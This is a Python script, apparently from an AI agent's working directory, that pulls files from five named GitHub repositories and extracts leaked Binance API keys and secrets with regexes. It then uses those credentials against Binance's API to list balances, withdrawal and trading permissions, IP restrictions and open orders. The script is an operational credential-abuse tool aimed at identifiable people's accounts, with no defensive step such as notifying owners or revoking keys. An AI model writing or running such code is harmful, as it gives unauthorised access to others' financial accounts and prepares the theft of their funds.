#!/usr/bin/env python3
"""Check API permissions + withdrawal status on funded Binance accounts."""
import json, urllib.request, re, hmac, hashlib, time

TARGETS = [
    'ankitmaurya001/trading_infra',
    'realjackhalder/superrich',
    'adhitiad/quantsync',
    'aamirshehzad9/AITB',
    '3mlnssaco/crypto_search',
]

def get_raw(url):
    raw = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(raw, headers={'User-Agent': 'curl/7.0'}), timeout=10)
        return r.read().decode('utf-8', errors='replace')
    except:
        return ''

BN_K = re.compile(r'(?:BINANCE_API_KEY|api_key)\s*[=:\s"\']+([A-Za-z0-9]{16,})', re.I)
BN_S = re.compile(r'(?:BINANCE_SECRET_KEY|BINANCE_API_SECRET|api_secret|secret_key)\s*[=:\s"\']+([A-Za-z0-9]{30,})', re.I)

def binance_api(k, s, path, params=''):
    ts = str(int(time.time() * 1000))
    qs = params + ('&' if params else '') + 'timestamp=' + ts
    sig = hmac.new(s.encode(), qs.encode(), hashlib.sha256).hexdigest()
    try:
        req = urllib.request.Request(
            'https://api.binance.com' + path + '?' + qs + '&signature=' + sig,
            headers={'X-MBX-APIKEY': k, 'User-Agent': 'curl/7.0'})
        return json.loads(urllib.request.urlopen(req, timeout=10).read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read().decode())
    except Exception as ex:
        return {'error': str(ex)}

import glob
url_map = {}
for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            if any(t in e.get('repo', '') for t in TARGETS):
                url_map[e['repo'] + '/' + e['path']] = e['url']
        except:
            pass

for repo_path, url in sorted(url_map.items()):
    if not any(t in repo_path for t in TARGETS):
        continue
    content = get_raw(url)
    time.sleep(0.2)
    km = BN_K.search(content)
    sm = BN_S.search(content)
    if not km or not sm:
        continue
    k, s = km.group(1).strip(), sm.group(1).strip()
    if len(k) < 16 or len(s) < 30:
        continue

    print('=' * 60)
    print('REPO:', repo_path)
    print('KEY:', k[:20] + '...')

    # Account info
    acct = binance_api(k, s, '/api/v3/account')
    time.sleep(0.3)
    bals = [b for b in acct.get('balances', []) if float(b['free']) > 0 or float(b['locked']) > 0.001]
    print('BALANCES:')
    for b in bals[:10]:
        free = float(b['free'])
        locked = float(b['locked'])
        if free > 0.0001 or locked > 0.0001:
            print('  ' + b['asset'] + ': free=' + str(round(free, 8)) + ' locked=' + str(round(locked, 8)))

    # API permissions
    perms = binance_api(k, s, '/sapi/v1/account/apiRestrictions')
    time.sleep(0.3)
    if 'code' not in perms:
        print('PERMISSIONS:')
        print('  withdraw:', perms.get('enableWithdrawals', False))
        print('  trade:', perms.get('enableSpotAndMarginTrading', False))
        print('  futures:', perms.get('enableFutures', False))
        print('  IP_locked:', perms.get('ipRestrict', False))
        if perms.get('ipRestrict'):
            print('  allowed_IPs:', perms.get('ipList', []))
    else:
        print('PERMS ERROR:', perms.get('code'), perms.get('msg', '')[:60])

    # Check if there are any open orders
    open_orders = binance_api(k, s, '/api/v3/openOrders')
    time.sleep(0.2)
    if isinstance(open_orders, list):
        print('OPEN ORDERS:', len(open_orders))
    print()
